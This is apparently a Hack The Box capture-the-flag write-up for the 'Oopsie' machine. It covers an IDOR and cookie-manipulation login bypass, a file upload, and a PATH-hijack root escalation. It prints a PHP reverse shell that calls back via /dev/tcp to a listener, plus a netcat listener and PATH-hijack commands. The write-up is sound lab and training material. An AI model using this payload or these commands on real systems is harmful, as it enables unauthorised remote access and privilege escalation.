---
title: Hack The Box - Oopsie Writeup
categories:
  - CYBERSECURITY
  - PENTEST
tags:
  - HTB
  - WEB
  - PATH-HIJACK
  - PRIVESC
  - LINUX
---
 # **Oopsie**
 
![Icon](/assets/img/Oopsie/icon.png)
## **Enumeration**

Initiate reconnaissance by **nmap** command:

![Nmap Scan Result](/assets/img/Oopsie/nmap.png)

 **Opened port**

- 22  ssh port
- 80 http port
  
After inspect the home page source code, we found an url that is use to login. Next we can login as guest.
  
  ![sourecode](/assets/img/Oopsie/inspect_homepage.png)

## **Exploitation**
There is an IDOR vunerbility on web browser url that enable us to access admin's access token and username. 
![Nmap Scan Result|601](/assets/img/Oopsie/idor.png)


I used **cookie manipulation** to access some features that guest cannot. That feature is upload and it's worth to upload an **PHP reverse shel**l.
![Nmap Scan Result|601](/assets/img/Oopsie/upload.png)

Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'"); ?>```.

Can't find any subdirectory of "upload" so I use **gobuster** :

![gobuster](/assets/img/Oopsie/gobuster.png)

and that actually found an exact url to uploaded folder. 




After that i prepare my **listener** : ```nc -lvnp 4444```.

![listener](/assets/img/Oopsie/listener.png)

To get a reverse shell i have to go to this exact url :
**"https://10.129.95.191/uploads/shell.php"**.

The moment I executed all of these steps, finally got an reverse shell.

![foothold](/assets/img/Oopsie/foothold.png)

User flag can be found on ```/home/robert```

![userflag](/assets/img/Oopsie/user_flag.png)

## **Lateral Movement**


Credential of username **"robert"**  can be found at ```/var/www/html/cdn-cgi/login ```. Before we continue as user robert I want to upgrade my shell a little bit to be able to use **su** command 
: ```python3 -c 'import pty;pty.spawn("/bin/bash")' ```

![surobert](/assets/img/Oopsie/su_robert.png)


Check basic command such as ```sudo -l``` to check if I can easily use **sudo** to **privilege escalation**, unfortunately we can't. Next check **id** of the user. What i noticed is ```1001(bugtracker)```

![sudo](/assets/img/Oopsie/sudo.png)

## **Privilege Escalation**

I use ```find / -group bugtracker 2>/dev/null ``` to find any directory, folder, file that is relevant to **bugtacker** and throw any thing that doesn't relevant to the group away, the path is ```/usr/bin ``` .
Then i want to check behaviour of the program by ```strings bugtracker```. The result is it didn't use **absolute path**


![bugtracker](/assets/img/Oopsie/bugtracker.png)
![path](/assets/img/Oopsie/path.png)

that mean we can utilize technique called **"Path Hijacking"**.
```echo '/bin/bash' > /tmp/cat ```
```chmod +x /tmp/cat```
```PATH=/tmp:$PATH ```
```export PATH```

then run the program again, this time we escalate as root

![pathhijac](/assets/img/Oopsie/path_hijacking.png)



Root flag can be found at ```/root```

![rootflag](/assets/img/Oopsie/root_flag.png)

